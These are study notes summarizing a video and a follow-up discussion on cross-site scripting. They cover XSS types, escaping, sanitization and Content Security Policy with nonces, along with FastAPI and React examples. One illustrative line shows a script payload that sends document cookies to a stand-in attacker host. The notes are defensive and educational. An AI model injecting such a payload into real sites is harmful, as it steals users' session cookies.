# XSS Attacks

YT: 

[https://www.youtube.com/watch?v=m-0p2BFAZvI](https://www.youtube.com/watch?v=m-0p2BFAZvI)

Here are **key point notes summarizing the ByteMonk video "XSS Attacks Explained – How HACKERS steal data with one line of code"** for easy review and memory refresh. Topics you specifically asked about (CSP, prevention in web frameworks, React, etc.) are **emphasized and cross-linked to our discussion**.

---

## XSS Overview

- **XSS (Cross-Site Scripting)** is one of the most dangerous and common web vulnerabilities.
- Enables attackers to **inject scripts** into trusted web pages, hijack sessions, steal cookies/credentials, and compromise accounts.

---

## Types of XSS Attacks

- **Stored XSS:**
    - Malicious script is permanently stored on the server (e.g., in a DB via comment section).
    - Triggers automatically whenever anyone loads the infected page.
    - **Example:** The MySpace "Samy Worm" spread via stored XSS and shut down MySpace for hours.
- **Reflected XSS:**
    - Script is injected into a URL by the attacker.
    - Victims trigger it by clicking the malicious link (social engineering via email/social/ads).
    - **Example:** PayPal bug (2019)—attackers tricked users, stole session tokens, got paid $115K for bug disclosure.
- **DOM-Based XSS:**
    - Attack is triggered by manipulating the page via client-side JavaScript (does **not** touch backend/server).
    - Malicious data is processed and executed directly in the browser.
    - **Example:** Google Docs bug—script executed via document URL, fixed after disclosure.

---

## Attack Flow (General)

- Attacker finds input not sanitized or escaped.
- Injects script using comment, URL, or front-end manipulation.
- When site renders untrusted content, browser executes attacker's code.
- Consequences: Account hijacking, data theft, phishing redirects, worm propagation.

---

## Prevention and Best Practices

## **(Highlights from our conversation: Express, FastAPI, Django)**

- **Input sanitization:** Always clean user input server-side before saving or rendering.
- **Output escaping:**
    - When rendering user data, escape HTML special chars so scripts are shown as text, not code.
    - Use HTML template engines/frameworks with auto-escaping.
- **JavaScript security libraries:** e.g., use DOMPurify for front-end sanitation in JS.
- **Validate URLs and sanitize any content reflected/displayed to users.**
- **React-specific:**
    - React escapes output by default; risk only if using `dangerouslySetInnerHTML` or rendering raw, untrusted data.
    - CSP and proper React coding make XSS unlikely unless a dangerous pattern is introduced (see earlier answers).
- **Strict CSP (Content Security Policy):**
    - **Configures the browser** to block inline scripts, remote JavaScript, and anything not explicitly whitelisted.
    - Only allows scripts from 'self' or trusted sources; blocks inline `<script>`. Prevents XSS even if a vulnerability exists!
    - Use nonce or hash for fine-grained script control.
    - CSP enforcement also applies to React/SPA bundles—refer to our previous answers for how it affects React code specifically.
- **Frontend methods:** Use `textContent` over `innerHTML`, and `document.createTextNode` for added safety.

---

## Developer Action Items

- Always **sanitize and validate input** (backend and frontend).
- Use **escaping in templates** and avoid "trusted" raw output.
- Configure a **strict CSP header** on your server to block scripts not explicitly allowed.
- Use reputable **security libraries** (DOMPurify for JS, `bleach` or `nh3` for Python) for sanitation.
- Regularly audit code for risky patterns, especially if using frameworks like React, Django, FastAPI, or Express.

---

## Questions from Discussion & Your Doubts

- **CSP works at browser level; server sends policy, browser blocks (enforces) unsafe scripts.**
- **In React:** CSP will block any `<script>` output, whether inline or external, unless origin or nonce/hash is allowed. React default behavior is safe—risks arise only with unsafe rendering patterns.
- **How attackers exploit XSS, and how CSP, escaping, and sanitization combine to block them**—practical examples and browser error messages when blocked.
- **Why every web developer needs these controls, especially at scale on major platforms.**

---

## **Concrete Summary For Your Revision**

- Know the **three types of XSS**, their triggers, and real-world effects.
- Practice **input/output sanitation and escaping** in all code and templates.
- Apply **strict CSP headers**—understand how they block both inline and external scripts.
- Regularly review code, especially in SPA (React, Angular, etc.), and audit with tools/static analysis.
- **Never allow raw user input to be rendered without escaping or sanitization.**
- CSP is a **defense-in-depth tool**; combine it with good coding habits and library support for robust protection.

---

Use this summary to quickly refresh concepts, practical defense techniques, and the specific answers to your doubts on CSP and XSS prevention.

1. [https://www.youtube.com/watch?v=m-0p2BFAZvI](https://www.youtube.com/watch?v=m-0p2BFAZvI)

---

## CSP Deep Dive (Follow-up Session)

Deeper follow-up on how CSP actually works mechanically, since "CSP blocks bad scripts" was too fuzzy.

### Which response needs the header?

Only the response that delivers the **HTML document itself** — not every sub-resource. The browser reads CSP once when it loads the page, then enforces that one policy against every later request the page makes (scripts, styles, images, fetch/XHR). Setting CSP on every API/JSON response is unnecessary overhead — only attach it to `text/html` responses:

```python
@app.middleware("http")
async def add_csp_header(request: Request, call_next):
    response = await call_next(request)
    if response.headers.get("content-type", "").startswith("text/html"):
        response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self' cdn.jsdelivr.net"
    return response
```

If the backend is a pure JSON API and HTML is served separately (e.g. React build), CSP is really the frontend server's job, not the API's.

### Inline vs external script — concretely, with React

A built React `index.html` (Vite/CRA) is almost empty — one `<script src="/assets/bundle.js">` loads the entire app. This is an **external script** — browser fetches it separately, `script-src 'self'` covers it, no special keyword needed.

**Inline script** = JS written directly inside the HTML document, not in a separate file:
```html
<script>window.__ENV__ = { apiUrl: "..." }</script>
```
Structurally identical to an XSS payload (`<script>fetch('evil.com?'+document.cookie)</script>`) — the browser can't tell "intentional" from "injected" inline code, so CSP blocks **both** unless explicitly allowed (`unsafe-inline` or nonce). This is the one case a React app might still need an inline script for — env injection before the bundle loads.

### `onclick="..."` (raw HTML) vs React's `onClick={...}` — the key nuance

- **Raw HTML `onclick="alert('hi')"`**: the JS string sits *inside an HTML attribute*, parsed and run by the browser's HTML parser. This is inline — same category as an inline `<script>` tag. Blocked under strict CSP unless `unsafe-inline` (specifically the `script-src-attr` piece).
- **React `onClick={() => alert('hi')}`**: not HTML at all — JSX compiles this into a plain `addEventListener()` call *inside bundle.js*. The actual HTML that reaches the browser has no `onclick=` attribute (inspect DOM — just `<button>`). Since this lives entirely in an already-trusted external script, it's never inline for CSP purposes.

**Conclusion: a standard React app can run under strict CSP (`script-src 'self'`, no `unsafe-inline`) because React never writes inline handlers into HTML** — it always wires events via JS running from the bundle.

### `unsafe-inline`, precisely

A value added to `script-src` that tells the browser to trust JS written directly in the HTML — both bare `<script>` blocks and `onclick=`-style attributes. Exists mainly as a migration escape hatch for older sites full of inline handlers; defeats most of CSP's XSS protection since it can't distinguish trusted inline code from injected inline code. For a React app, almost never needed — the only case is a literal `<script>` block added to `index.html` (e.g. one-off env config).

### Nonce — how it actually fixes inline scripting

A nonce is a random, one-time value generated **fresh on every request** (not per app — per request):

```python
nonce = secrets.token_hex(16)
# same value goes in two places:
# 1. CSP header:  script-src 'self' 'nonce-aB3xZ9...'
# 2. script tag:  <script nonce="aB3xZ9...">...</script>
```

Browser rule: only execute an inline script whose `nonce` attribute matches the header's nonce for *this* response. An attacker's injected `<script>` has no way to know the current request's random nonce (it changes every request, before the attacker's injection can read it) — so it has no nonce attribute, fails the match, gets blocked. This is strictly better than `unsafe-inline`: `unsafe-inline` trusts *all* inline scripts, a nonce trusts only the one(s) that know today's secret.

### CSP boundary: doesn't cover the DevTools console

CSP restricts what **the page's own code** tries to load/execute — external `<script src>`, inline `<script>` blocks, `eval()`/`new Function()` (needs `unsafe-eval`). It does **not** restrict code a human manually types or pastes into the browser's DevTools console — that's a separate execution surface, not something the page loaded. Even `script-src 'none'` does nothing here; console execution is treated as the user exercising their own privileges, not the page misbehaving.

This is exactly why **self-XSS** works as an attack vector: since the console bypasses CSP entirely, attackers trick victims into pasting malicious code into their own console (fake "unlock feature" prompts, fake support scripts) — no injection vulnerability needed, just social engineering. This is why Chrome/Firefox show a "don't paste code you don't understand" warning the first time DevTools opens.
